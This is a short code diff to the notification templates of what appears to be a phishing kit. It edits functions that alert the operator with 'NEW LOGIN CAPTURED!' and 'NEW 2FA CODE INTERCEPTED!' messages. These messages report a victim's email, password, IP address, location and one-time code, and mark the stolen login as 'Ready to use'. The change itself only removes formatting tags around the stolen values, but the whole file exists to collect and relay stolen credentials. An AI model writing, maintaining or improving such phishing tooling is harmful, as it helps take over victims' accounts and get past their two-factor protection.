@@ -2,7 +2,7 @@ async function visitorNotification(linkname){
     return `
 🎯 <b>NEW VISITOR DETECTED!</b> 🎯
 
-🔍 <b>Link Name:</b> <code>${linkname}</code>
+🔍 <b>Link Name:</b> ${linkname}
 ⚡️ Visitor is on the page
 🕒 Waiting for action...
 
@@ -20,13 +20,13 @@ async function loginNotification(email, password, platform, ip, city, country){
 🎉 <b>NEW LOGIN CAPTURED!</b> 🎉
 
 ${platformEmoji} <b>Platform:</b> ${platform}
-📧 <b>Email/Username:</b> <code>${email}</code>
-🔑 <b>Password:</b> <code>${password}</code>
+📧 <b>Email/Username:</b> ${email}
+🔑 <b>Password:</b> ${password}
 
 📍 <b>Location Details:</b>
 🌍 Country: ${country}
 🏙️ City: ${city}
-🔒 IP: <code>${ip}</code>
+🔒 IP: ${ip}
 
 ⚡️ Login details captured successfully!
 🎯 Ready to use
@@ -44,7 +44,7 @@ async function otpNotification(otp, platform){
 🔐 <b>NEW 2FA CODE INTERCEPTED!</b> 🔐
 
 ${platformEmoji} <b>Platform:</b> ${platform}
-🔑 <b>OTP Code:</b> <code>${otp}</code>
+🔑 <b>OTP Code:</b> ${otp}
 
 ⚡️ Code captured successfully!
 ⏰ Valid for a limited time
